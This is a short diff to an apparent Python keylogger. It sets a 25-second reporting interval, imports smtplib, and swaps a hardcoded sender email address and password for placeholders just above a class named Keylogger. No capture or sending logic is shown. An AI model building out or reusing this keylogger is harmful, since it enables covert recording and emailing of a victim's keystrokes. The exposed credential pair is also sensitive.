@@ -5,8 +5,8 @@ import smtplib
 from threading import Timer
 from datetime import datetime
 INTERVAL = 25
-EMAIL_ADDRESS= "fsattacker247@gmail.com"
-EMAIL_PASSWORD ="FS123456789"
+EMAIL_ADDRESS= <HOST EMAIL>
+EMAIL_PASSWORD = <HOST PASSWORD>
 
 
 class Keylogger:
